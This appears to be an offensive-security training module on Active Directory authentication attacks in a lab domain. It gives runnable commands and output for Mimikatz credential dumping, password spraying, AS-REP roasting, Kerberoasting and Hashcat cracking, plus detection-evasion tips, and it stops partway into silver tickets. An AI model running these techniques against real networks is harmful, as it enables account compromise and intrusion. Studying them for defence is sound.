# Attacking Active Directory Authentication

Active Directory authentication mechanisms form the backbone of enterprise security, but they also present significant attack surfaces when properly understood and exploited. This module focuses on leveraging enumeration intelligence to compromise AD authentication systems through targeted attacks against password hashes, Kerberos tickets, and authentication protocols.

Building upon the reconnaissance gathered in the Active Directory Introduction and Enumeration module, we will explore how to weaponize user accounts, group memberships, and Service Principal Names (SPNs) to gain unauthorized access and escalate privileges within the corp.com domain environment.

## Table of Contents

### 1. [Understanding Active Directory Authentication](#understanding-active-directory-authentication)
- **1.1 [NTLM Authentication](#ntlm-authentication)**
- **1.2 [Kerberos Authentication](#kerberos-authentication)**
- **1.3 [Windows Credential Caching](#windows-credential-caching)**

### 2. [Performing Attacks on Active Directory Authentication](#performing-attacks-on-active-directory-authentication)
- **2.1 [Password Hash Attacks](#password-hash-attacks)**
- **2.2 [AS-REP Roasting](#as-rep-roasting)**
- **2.3 [Kerberoasting](#kerberoasting)**
- **2.4 [Silver Tickets](#silver-tickets)**
- **2.5 [Domain Controller Synchronization (DCSync)](#domain-controller-synchronization-dcsync)**

---

## Understanding Active Directory Authentication

Active Directory supports multiple authentication protocols designed for various scenarios and compatibility requirements. Understanding these mechanisms is crucial for identifying attack vectors and exploitation opportunities within enterprise environments.

**Learning Objectives:**
- Understand NTLM Authentication mechanisms and vulnerabilities
- Understand Kerberos Authentication protocols and attack surfaces
- Become familiar with cached Active Directory credentials and storage

Active Directory implements several authentication protocols to support diverse operating systems and applications. This section explores the technical details of these authentication protocols, their implementation in Active Directory environments, and the credential caching mechanisms that enable both functionality and exploitation opportunities.

---

## NTLM Authentication

NTLM (NT LAN Manager) authentication serves as a critical fallback mechanism in Active Directory environments, particularly when Kerberos authentication is unavailable or inappropriate for specific scenarios.

**NTLM Usage Scenarios:**
- Client authentication to servers via IP address (bypassing hostname resolution)
- Authentication to hostnames not registered in Active Directory-integrated DNS
- Third-party applications that specifically implement NTLM over Kerberos
- Legacy system compatibility requirements

### NTLM Authentication Flow

The NTLM authentication process consists of a seven-step challenge-response mechanism involving the client, application server, and domain controller:

**Step 1-2:** Client calculates NTLM hash from password and sends username to target server
**Step 3:** Server generates random nonce (challenge) and returns to client
**Step 4:** Client encrypts nonce using stored NTLM hash and sends response
**Step 5-6:** Server forwards authentication data to domain controller; DC validates by comparing encrypted nonce results
**Step 7:** Authentication result communicated back through server to client

### NTLM Security Characteristics

**Cryptographic Properties:**
- **Hash Algorithm:** MD4-based (inherently weak)
- **Speed:** Fast-hashing algorithm enables efficient offline attacks
- **Salt:** No salt used (enables rainbow table attacks)

**Attack Surface:**
- **Brute Force:** High-speed hash testing possible (600+ billion hashes/second with high-end GPUs)
- **Pass-the-Hash:** NTLM hashes can be used directly for authentication
- **Relay Attacks:** NTLM authentication can be relayed to other services

---

## Kerberos Authentication

Kerberos serves as the primary authentication protocol in Active Directory environments since Windows Server 2003, representing a sophisticated ticket-based system that provides enhanced security features over NTLM.

**Kerberos Foundation:**
- **Origin:** Based on MIT's Kerberos version 5 protocol
- **Architecture:** Ticket-based authentication system
- **Key Distribution Center (KDC):** Domain controllers serve dual roles as authentication servers

### Kerberos Authentication Flow

The Kerberos authentication process involves a six-step ticket exchange mechanism:

**Step 1-2:** Client sends AS-REQ (username + encrypted timestamp) to KDC; KDC validates and returns AS-REP (session key + TGT)
**Step 3-4:** Client sends TGS-REQ (encrypted username/timestamp + resource name + TGT) to KDC; KDC validates and returns TGS-REP (service ticket)
**Step 5-6:** Client sends AP-REQ (encrypted username/timestamp + service ticket) to application server; server validates and grants access

### Kerberos Security Architecture

**Authentication Strengths:**
- **Mutual Authentication:** Both client and server identities verified
- **No Password Transmission:** Passwords never sent over network
- **Replay Protection:** Timestamp validation prevents replay attacks
- **Single Sign-On:** TGT enables access to multiple resources

**Ticket Components:**
- **TGT:** Encrypted with krbtgt account hash, default 10-hour lifetime
- **Service Tickets:** Encrypted with service account password hash, per-service basis

### Kerberos Attack Surface

**Ticket-Based Vulnerabilities:**
- **Kerberoasting:** Service account password hash extraction via service tickets
- **ASREPRoast:** Targeting accounts with pre-authentication disabled
- **Golden Tickets:** krbtgt hash compromise enables domain-wide access
- **Silver Tickets:** Service account hash compromise enables service-specific access

---

## Windows Credential Caching

Windows systems cache authentication credentials and tickets in memory to enable single sign-on functionality. Understanding these caching mechanisms is crucial for credential harvesting attacks.

### LSASS Memory Storage

**Local Security Authority Subsystem Service (LSASS):**
- **Primary Function:** Manages authentication credentials and security policies
- **Memory Storage:** Caches password hashes, Kerberos tickets, and authentication tokens
- **Process Privileges:** Runs as SYSTEM with elevated security context

**Credential Types Stored:**
- **NTLM Hashes:** Domain user password hashes for authentication
- **Kerberos Tickets:** TGTs and service tickets for current sessions
- **Plaintext Passwords:** When WDigest authentication is enabled (legacy systems)
- **Certificate Private Keys:** PKI credentials for certificate-based authentication

### Mimikatz: Credential Extraction Tool

**Prerequisites:**
- Administrative privileges (local administrator or SYSTEM access)
- SeDebugPrivilege to interact with LSASS process

**Basic Credential Extraction:**
```powershell
# Launch Mimikatz and enable debug privileges
.\mimikatz.exe
privilege::debug

# Extract cached credentials
sekurlsa::logonpasswords

# Extract Kerberos tickets
sekurlsa::tickets
```

**Hash Types and Functional Levels:**
- **Windows 2003:** NTLM hashes only
- **Windows 2008+:** NTLM and SHA-1 hashes available
- **Legacy Systems:** WDigest enabled = plaintext passwords exposed

### Defensive Countermeasures

**LSA Protection:**
- Enable additional LSA protection via registry key
- Prevents unauthorized LSASS memory access

**WDigest Disabling:**
- Disabled by default on modern systems (Windows 8.1+/Server 2012 R2+)
- Manual disabling required on legacy systems

**OpSec Considerations:**
- Well-known tool with established signatures
- Use memory injection or process dumping for evasion
- Alternative tools and obfuscation techniques available

---

## Performing Attacks on Active Directory Authentication

Building upon our understanding of AD authentication mechanisms and credential caching, we now explore practical attack techniques that exploit these systems to gain unauthorized access and escalate privileges within domain environments.

---

## Password Hash Attacks

Password attacks against Active Directory leverage various vectors including password spraying, hash extraction, and credential reuse. Understanding account lockout policies and implementing stealthy attack methodologies are crucial for successful credential compromise.

### Account Lockout Policy Analysis

**Reconnaissance with net accounts:**
```powershell
# Examine domain account policy
net accounts
```

**Sample Policy Output:**
```
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          42
Minimum password length:                              7
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
```

**Critical Policy Parameters:**
- **Lockout Threshold**: 5 failed attempts trigger account lockout
- **Lockout Duration**: 30-minute lockout period
- **Observation Window**: 30-minute reset period for failed attempts
- **Safe Attack Window**: 4 attempts per user before lockout risk

**Attack Calculation:**
- **Daily Attempts**: 192 login attempts per user per 24-hour period
- **Strategy**: 4 attempts, wait 30 minutes, repeat cycle
- **Risk Mitigation**: Avoid triggering lockouts while maintaining attack persistence

### LDAP-Based Password Spraying

**DirectoryEntry Authentication Method:**
LDAP-based authentication provides stealthy password validation with minimal network noise compared to SMB-based attacks.

**LDAP Path Construction:**
```powershell
# Build LDAP connection string dynamically
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName

# Test credentials via DirectoryEntry constructor
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

**Successful Authentication Response:**
```
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com
```

**Failed Authentication Response:**
```
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or password is incorrect."
    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
```

### Automated Password Spraying with Spray-Passwords.ps1

**Tool Location and Execution:**
```powershell
# Navigate to tools directory
cd C:\Tools

# Bypass execution policy
powershell -ep bypass

# Execute password spray attack
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```

**Command Parameters:**
- **-Pass**: Single password to test against all users
- **-File**: Wordlist file for multiple password attempts
- **-Admin**: Include administrative accounts in attack scope

**Sample Attack Output:**
```
WARNING: also targeting admin accounts.
Performing brute force - press [q] to stop the process and print results...
Guessed password for user: 'pete' = 'Nexus123!'
Guessed password for user: 'jen' = 'Nexus123!'
Users guessed are:
 'pete' with password: 'Nexus123!'
 'jen' with password: 'Nexus123!'
```

**Attack Features:**
- **Account Policy Awareness**: Respects lockout thresholds and observation windows
- **User Enumeration**: Automatically discovers domain users
- **Progress Monitoring**: Real-time feedback on successful authentications
- **Stealth Operation**: LDAP-based validation minimizes network signatures

### SMB-Based Password Spraying with CrackMapExec

**Tool Setup and User List Creation:**
```bash
# Create target user list
cat users.txt
dave
jen
pete

# Execute SMB-based password spray
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

**Attack Output Analysis:**
```
SMB         192.168.50.75   445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.50.75   445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\jen:Nexus123!
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\pete:Nexus123!
```

**Administrative Privilege Detection:**
```bash
# Test specific user with known credentials
crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
```

**Administrative Access Indicator:**
```
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)
```

**SMB Method Characteristics:**
- **High Network Noise**: Full SMB connection establishment per attempt
- **Slower Performance**: Connection overhead impacts attack speed
- **Administrative Detection**: "Pwn3d!" indicator shows local admin rights
- **No Policy Awareness**: Does not check account lockout policies

### Kerberos-Based Password Spraying with Kerbrute

**Kerberos Pre-Authentication Attack:**
Kerbrute leverages Kerberos AS-REQ requests to validate credentials with minimal network traffic (only 2 UDP frames per attempt).

**User List Preparation:**
```powershell
# Create username list
type .\usernames.txt
pete
dave
jen
```

**Kerbrute Execution:**
```powershell
# Execute Kerberos-based password spray
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

**Attack Output:**
```
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 09/06/22 - Ronnie Flathers @ropnop

2022/09/06 20:30:48 >  Using KDC(s):
2022/09/06 20:30:48 >   dc1.corp.com:88
2022/09/06 20:30:48 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
2022/09/06 20:30:48 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
2022/09/06 20:30:48 >  Done! Tested 3 logins (2 successes) in 0.041 seconds
```

**Kerberos Method Advantages:**
- **Minimal Network Traffic**: Only AS-REQ and AS-REP packets
- **High Speed**: Fastest password spraying method
- **KDC Direct Communication**: Bypasses intermediate authentication layers
- **Cross-Platform Support**: Available for Windows, Linux, and macOS

### Password Spraying Method Comparison

| Method | Tool | Network Noise | Speed | Admin Detection | Policy Awareness |
|--------|------|---------------|-------|-----------------|------------------|
| **LDAP** | Spray-Passwords.ps1 | Low | Medium | No | Yes |
| **SMB** | CrackMapExec | High | Slow | Yes | No |
| **Kerberos** | Kerbrute | Minimal | Fast | No | No |

### Attack Strategy Considerations

**Method Selection Criteria:**
1. **Stealth Requirements**: LDAP or Kerberos for low-noise operations
2. **Speed Priority**: Kerberos for rapid credential validation
3. **Administrative Discovery**: SMB for immediate privilege assessment
4. **Policy Compliance**: LDAP-based tools respect account lockout policies

**Username Enumeration Integration:**
- **Manual Lists**: Created from previous enumeration activities
- **Built-in Enumeration**: Tools with integrated user discovery
- **AD Enumeration**: Leverage techniques from previous modules
- **OSINT Sources**: External intelligence gathering

### Password Spraying Commands Reference

**LDAP-Based Attack (Manual):**
```powershell
# Dynamic LDAP path construction
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://$PDC/DC=$($domainObj.Name.Replace('.', ',DC='))"

# Test single credential
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "<username>", "<password>")
```

**Spray-Passwords.ps1:**
```powershell
# Single password spray
.\Spray-Passwords.ps1 -Pass <password>

# Wordlist-based spray
.\Spray-Passwords.ps1 -File <wordlist_file>

# Include administrative accounts
.\Spray-Passwords.ps1 -Pass <password> -Admin
```

**CrackMapExec:**
```bash
# Single user/password test
crackmapexec smb <target_ip> -u <username> -p '<password>' -d <domain>

# User list password spray
crackmapexec smb <target_ip> -u <user_file> -p '<password>' -d <domain> --continue-on-success

# Multiple passwords against single user
crackmapexec smb <target_ip> -u <username> -p <password_file> -d <domain>
```

**Kerbrute:**
```powershell
# Password spray attack
.\kerbrute_windows_amd64.exe passwordspray -d <domain> <user_file> "<password>"

# User enumeration
.\kerbrute_windows_amd64.exe userenum -d <domain> <user_file>

# Brute force attack
.\kerbrute_windows_amd64.exe bruteuser -d <domain> <password_file> <username>
```

### Defensive Considerations

**Account Lockout Policy Optimization:**
- **Threshold Setting**: Balance security with usability (3-5 attempts)
- **Lockout Duration**: Long enough to deter attacks, short enough for users
- **Observation Window**: Reset period for failed attempt counters
- **Administrative Exemptions**: Consider excluding service accounts

**Detection and Monitoring:**
- **Authentication Logs**: Monitor for multiple failed login patterns
- **Network Traffic Analysis**: Identify password spraying signatures
- **Account Lockout Alerts**: Immediate notification of lockout events
- **Behavioral Analytics**: Detect unusual authentication patterns

### Key Insights for Password Attacks

**Attack Effectiveness:**
- Password spraying often succeeds against weak organizational password policies
- Multiple attack vectors provide flexibility based on operational requirements
- Account lockout policies create both challenges and opportunities for attackers
- Stealthy methods (LDAP, Kerberos) reduce detection likelihood

**Operational Security:**
- Respect account lockout policies to maintain attack persistence
- Use multiple attack methods to validate results and avoid false positives
- Document successful credentials immediately for lateral movement planning
- Consider timing attacks during business hours to blend with legitimate traffic

Password spraying attacks represent highly effective techniques for initial credential compromise in Active Directory environments, particularly when combined with proper reconnaissance and account policy analysis.

---

## AS-REP Roasting

AS-REP Roasting exploits accounts with disabled Kerberos pre-authentication, allowing attackers to request AS-REP responses containing encrypted material that can be subjected to offline password attacks without prior authentication.

### Kerberos Pre-Authentication Mechanism

**Standard Kerberos Flow:**
1. **AS-REQ**: Client sends authentication request with encrypted timestamp
2. **Pre-Authentication Validation**: Domain controller verifies encrypted timestamp
3. **AS-REP**: Domain controller responds with session key and TGT (if valid)

**Pre-Authentication Bypass:**
- **Disabled Setting**: "Do not require Kerberos preauthentication" account option
- **Attack Vector**: Request AS-REP without providing encrypted timestamp
- **Result**: Obtain encrypted AS-REP response for offline cracking

### Vulnerability Identification

**Account Configuration Check:**
- **Default State**: Kerberos pre-authentication enabled for all users
- **Manual Override**: Administrators can disable per-account
- **Common Causes**: Legacy application compatibility requirements
- **Security Impact**: Enables offline password attacks

### Linux-Based AS-REP Roasting with Impacket

**Tool: impacket-GetNPUsers**

**Basic Enumeration (Identify Vulnerable Users):**
```bash
# Enumerate accounts without pre-authentication required
impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/pete
```

**Full AS-REP Roasting Attack:**
```bash
# Request AS-REP hashes for vulnerable accounts
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
```

**Command Parameters:**
- **-dc-ip**: Domain controller IP address
- **-request**: Request TGT for vulnerable accounts
- **-outputfile**: Save hashes in Hashcat-compatible format
- **corp.com/pete**: Domain/username for authentication

**Sample Attack Output:**
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
----  --------  --------------------------  --------------------------  --------
dave            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200
```

### Windows-Based AS-REP Roasting with Rubeus

**Tool: Rubeus.exe**

**Automated AS-REP Roasting:**
```powershell
# Navigate to tools directory
cd C:\Tools

# Execute AS-REP roasting attack
.\Rubeus.exe asreproast /nowrap
```

**Command Parameters:**
- **asreproast**: Specify AS-REP roasting attack mode
- **/nowrap**: Prevent line breaks in hash output (improves copy/paste)

**Sample Attack Output:**
```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2

[*] Action: AS-REP roasting
[*] Target Domain          : corp.com
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : dave
[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
[*] Using domain controller: DC1.corp.com (192.168.50.70)
[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

$krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
```

### Hash Cracking with Hashcat

**Identify Correct Hashcat Mode:**
```bash
# Search for Kerberos-related hash modes
hashcat --help | grep -i "Kerberos"
```

**Hashcat Mode Reference:**
```
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
```

**AS-REP Hash Cracking:**
```bash
# Crack AS-REP hash using mode 18200
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**Successful Crack Output:**
```
$krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578f03773a7908f337aa705bcb711f8bce2ca751a876a7564bdbd4a926c10da32b03ec750cf33a2c37abde02f28b7ab363ffa1d18c9dd0262e43ab6a5447db44f71256120f94c24b17b1df465beed362fcb14a539b4e9678029f3b3556413208e8d644fed540d453e1af6f20ab909fd3d9d35ea8b17958b56fd8658b144186042faaa676931b2b75716502775d1a18c11bd4c50df9c2a6b5a7ce2804df3c71c7dbbd7af7adf3092baa56ea865dd6e6fbc8311f940cd78609f1a6b0cd3fd150ba402f14fccd90757300452ce77e45757dc22:Flowers1
```

### Targeted AS-REP Roasting

**Prerequisites:**
- **GenericWrite** or **GenericAll** permissions on target user account
- **Attack Strategy**: Modify user account to disable pre-authentication
- **Post-Attack**: Reset User Account Control to original state

**PowerView User Enumeration:**
```powershell
# Identify users without pre-authentication requirement
Get-DomainUser -PreauthNotRequired
```

**Manual User Account Control Modification:**
```powershell
# Disable pre-authentication for target user (requires GenericWrite/GenericAll)
Set-DomainObject -Identity <target_user> -XOR @{useraccountcontrol=4194304}

# Perform AS-REP roasting
.\Rubeus.exe asreproast /user:<target_user> /nowrap

# Reset user account control (cleanup)
Set-DomainObject -Identity <target_user> -XOR @{useraccountcontrol=4194304}
```

### AS-REP Roasting Commands Reference

**Linux (Impacket):**
```bash
# Enumerate vulnerable users only
impacket-GetNPUsers -dc-ip <dc_ip> <domain>/<username>

# Full AS-REP roasting attack
impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile <output_file> <domain>/<username>

# Target specific user
impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile <output_file> <domain>/<username> -usersfile <user_list>
```

**Windows (Rubeus):**
```powershell
# Automatic vulnerable user discovery
.\Rubeus.exe asreproast /nowrap

# Target specific user
.\Rubeus.exe asreproast /user:<target_user> /nowrap

# Output to file
.\Rubeus.exe asreproast /outfile:<output_file> /nowrap

# Specify domain controller
.\Rubeus.exe asreproast /dc:<dc_fqdn> /nowrap
```

**Hash Cracking:**
```bash
# Crack AS-REP hash
hashcat -m 18200 <hash_file> <wordlist> -r <rules_file> --force

# Common wordlist and rules
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

---

## Kerberoasting

Kerberoasting exploits the Kerberos ticket-granting process by requesting service tickets for Service Principal Names (SPNs), then performing offline password attacks against the encrypted portions of these tickets.

### Kerberos Service Ticket Mechanism

**Service Ticket Request Process:**
1. **TGS-REQ**: Client requests service ticket for specific SPN
2. **No Authorization Check**: Domain controller issues ticket without permission validation
3. **Service Ticket**: Encrypted with service account password hash
4. **Authorization Check**: Performed only when accessing actual service

**Attack Opportunity:**
- **Ticket Acquisition**: Request service tickets for any known SPN
- **Offline Cracking**: Extract and crack encrypted service ticket
- **Password Recovery**: Obtain service account cleartext password

### Windows-Based Kerberoasting with Rubeus

**Automated Kerberoasting Attack:**
```powershell
# Navigate to tools directory
cd C:\Tools

# Execute Kerberoasting attack with output file
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

**Command Parameters:**
- **kerberoast**: Specify Kerberoasting attack mode
- **/outfile**: Save TGS-REP hashes to specified file
- **/nowrap**: Prevent line breaks in hash output (optional)

**Sample Attack Output:**
```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2

[*] Action: Kerberoasting
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
[*] Target Domain          : corp.com
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
[*] Total kerberoastable users : 1
[*] SamAccountName         : iis_service
[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
[*] ServicePrincipalName   : HTTP/web04.corp.com:80
[*] PwdLastSet             : 9/7/2022 5:38:43 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Tools\hashes.kerberoast
```

### Linux-Based Kerberoasting with Impacket

**Tool: impacket-GetUserSPNs**

**Kerberoasting Attack Execution:**
```bash
# Request service tickets for all SPNs
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

**Command Parameters:**
- **-request**: Request TGS tickets for discovered SPNs
- **-dc-ip**: Domain controller IP address
- **corp.com/pete**: Domain/username for authentication
- **-outputfile**: Optional output file for hashes

**Sample Attack Output:**
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  -----------  --------  --------------------------  ---------  ----------
HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  <never>               

[-] CCache file is not found. Skipping...
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec...
```

### TGS-REP Hash Cracking

**Hashcat Mode Identification:**
```bash
# Identify correct mode for TGS-REP hashes
hashcat --help | grep -i "Kerberos"
```

**TGS-REP Hash Cracking (Mode 13100):**
```bash
# Crack TGS-REP hash using Hashcat
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**Successful Crack Output:**
```
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940ad9dcf5dd5cd8e91a86d4ba0396db$f57066a4f4f8ff5d70df39b0c98ed7948a5db08d689b92446e600b49fd502dea39a8ed3b0b766e5cd40410464263557bc0e4025bfb92d89ba5c12c26c72232905dec4d060d3c8988945419ab4a7e7adec407d22bf6871d...d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce63694e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:Strawberry1
```

### Service Account Types and Attack Success

**High-Value Targets (User Accounts):**
- **Domain User Accounts**: Often have weak, static passwords
- **Service Accounts**: Frequently use predictable password patterns
- **Legacy Accounts**: May have never changed default passwords
- **Manual Configuration**: Human-set passwords susceptible to dictionary attacks

**Difficult Targets (System Accounts):**
- **Computer Accounts**: 120-character randomly generated passwords
- **Managed Service Accounts (MSA)**: Automatically managed complex passwords
- **Group Managed Service Accounts (gMSA)**: Centrally managed complex passwords  
- **krbtgt Account**: 120-character random password, changed infrequently

### Targeted Kerberoasting

**Prerequisites:**
- **GenericWrite** or **GenericAll** permissions on target user account
- **Attack Strategy**: Set SPN on user account, perform Kerberoasting
- **Post-Attack**: Remove SPN to avoid creating security vulnerabilities

**PowerView SPN Manipulation:**
```powershell
# Set SPN on target user account
Set-DomainObject -Identity <target_user> -Set @{serviceprincipalname='HTTP/fake.corp.com'}

# Perform Kerberoasting
.\Rubeus.exe kerberoast /user:<target_user> /nowrap

# Remove SPN (cleanup)
Set-DomainObject -Identity <target_user> -Clear serviceprincipalname
```

### Time Synchronization Issues

**Clock Skew Error Resolution:**
```bash
# Synchronize time with domain controller (Linux)
sudo ntpdate <dc_ip>

# Alternative time synchronization
sudo rdate -s <dc_ip>

# Verify time synchronization
date
```

**Error Message:**
```
KRB_AP_ERR_SKEW(Clock skew too great)
```

### Kerberoasting Commands Reference

**Windows (Rubeus):**
```powershell
# Basic Kerberoasting
.\Rubeus.exe kerberoast

# Output to file
.\Rubeus.exe kerberoast /outfile:<output_file>

# Target specific user
.\Rubeus.exe kerberoast /user:<target_user>

# Target specific SPN
.\Rubeus.exe kerberoast /spn:<service_principal_name>

# Force RC4 encryption (easier to crack)
.\Rubeus.exe kerberoast /tgtdeleg

# No line wrapping (better for copy/paste)
.\Rubeus.exe kerberoast /nowrap
```

**Linux (Impacket):**
```bash
# Basic enumeration
impacket-GetUserSPNs -dc-ip <dc_ip> <domain>/<username>

# Request all service tickets
impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<username>

# Output to file
impacket-GetUserSPNs -request -outputfile <output_file> -dc-ip <dc_ip> <domain>/<username>

# Target specific SPN
impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<username> -service-name <spn>
```

**Hash Cracking:**
```bash
# Crack TGS-REP hash (mode 13100)
hashcat -m 13100 <hash_file> <wordlist> -r <rules_file> --force

# Standard cracking command
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Attack Method Comparison

| Method | Tool | Platform | Authentication Required | Output Format |
|--------|------|----------|------------------------|---------------|
| **AS-REP Roasting** | impacket-GetNPUsers | Linux | Yes (for enumeration) | Hashcat compatible |
| **AS-REP Roasting** | Rubeus | Windows | Yes (domain context) | Hashcat compatible |
| **Kerberoasting** | impacket-GetUserSPNs | Linux | Yes | Hashcat compatible |
| **Kerberoasting** | Rubeus | Windows | Yes (domain context) | Hashcat compatible |

### Key Insights for Kerberos Attacks

**Attack Effectiveness:**
- AS-REP Roasting targets specific account misconfigurations
- Kerberoasting leverages fundamental Kerberos design characteristics
- Both attacks enable offline password cracking without account lockout risk
- Success depends heavily on password complexity of target accounts

**Operational Considerations:**
- Time synchronization critical for Kerberos-based attacks
- Hash format compatibility essential for successful cracking
- Cleanup operations important for targeted attacks (SPN removal, UAC reset)
- Service account passwords generally weaker than user account passwords

**Defensive Implications:**
- Regular audit of accounts with disabled pre-authentication
- Strong password policies for service accounts
- Migration to Managed Service Accounts where possible
- Monitoring for unusual TGS-REQ patterns and volumes

Both AS-REP Roasting and Kerberoasting represent powerful techniques for credential compromise in Active Directory environments, exploiting different aspects of the Kerberos authentication protocol to enable offline password attacks.

---

## Silver Tickets

Silver tickets represent forged Kerberos service tickets created using compromised service account credentials, enabling unauthorized access to specific services while bypassing normal authentication mechanisms and potentially evading detection.

### Service Ticket Forgery Fundamentals

**Kerberos Service Ticket Trust Model:**
- **Service Authentication**: Applications verify service tickets using service account password hash
- **Blind Trust**: Applications typically trust ticket integrity without additional validation
- **Group Membership**: Permissions determined by group memberships embedded in service ticket
- **PAC Validation**: Optional verification process (rarely implemented)

**Attack Prerequisites:**
1. **SPN Password Hash**: NTLM hash of service account
